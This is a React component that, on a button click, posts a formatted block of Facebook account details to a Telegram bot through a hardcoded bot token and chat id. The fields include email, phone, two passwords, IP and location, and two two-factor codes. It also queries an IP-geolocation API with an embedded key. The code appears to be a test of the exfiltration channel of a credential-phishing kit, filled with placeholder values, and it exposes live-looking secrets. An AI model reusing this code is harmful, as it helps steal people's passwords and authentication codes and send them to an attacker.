import React, { useState, useEffect } from 'react'
import axios from 'axios';
const Home = () => {
  const [message, setMessage] = useState('');
  const [ip, setIp] = useState('');
  const [city, setCity] = useState('');


  // useEffect(() => {
  //   const fetchData = async () => {
  //     try {
  //       const response = await axios.get('https://ipapi.co/json/');
  //       setIp(response.data.ip);
  //       setCity(response.data.city);
  //     } catch (error) {
  //       console.error('Error fetching data: ', error);
  //     }
  //   };

  //   fetchData();
  // }, []);
  const sendMessage = async () => {
    const response =
      axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=0b54578041c84e4684b6c0f2542c1721')
        .then(res => {
          console.log(res.data);
        })
        .catch(error => {
          console.log(error);
        });



    const API_URL = `https://api.telegram.org/bot7132569946:AAGNmy86xNs6x--A1OyDixdgE7be2kscibU/`;
    let message = `
Email Account: ptd@gmail.com
Name Account: PTD
Person Email: nvd@gmail.com
Facebook Page: TYPTIT
User Name: Duong
Phone Number: 031313
Password First: 123
Password Second: 123
Ip: 1.1.1.1
City: Sydney
Country: Vietnam
First Code Authen: 831783
Second Code Authen: 313131
Images Url:
✅Đã thêm vào sheet thành công
`;
    let CURRENT_API_URL = API_URL + "sendMessage"
    try {
      await axios.post(CURRENT_API_URL, {
        chat_id: '5342791241',
        parse_mode: "html",
        document: '',
        text: message,
        caption: message,
      }, {
        headers: {
          "Content-Type": 'multipart/form-data',
        }
      });
    } catch (err) {
      console.log("err: ", err)
    }
  };
  return (
    <div>
      <button onClick={sendMessage}>Send Message</button>
      <div >
        <p>Email Account: ptd@gmail.com</p>
        <p>Name Account: PTD</p>
        <p>Person Email: nvd@gmail.com</p>
        <p>Facebook Page: TYPTIT</p>
        <p>User Name: Duong</p>
        <p>Phone Number: 031313</p>
        <p>Password First: 123</p>
        <p>Password Second: 123</p>
        <p>Ip: 1.1.1.1</p>
        <p>City: Sydney</p>
        <p>Country: Vietnam</p>
        <p>First Code Authen: 831783</p>
        <p>Second Code Authen: 313131</p>
        <p>Images Url:</p>
        <p>✅Đã thêm vào sheet thành công</p>
      </div>
    </div>

  )
}

export default Home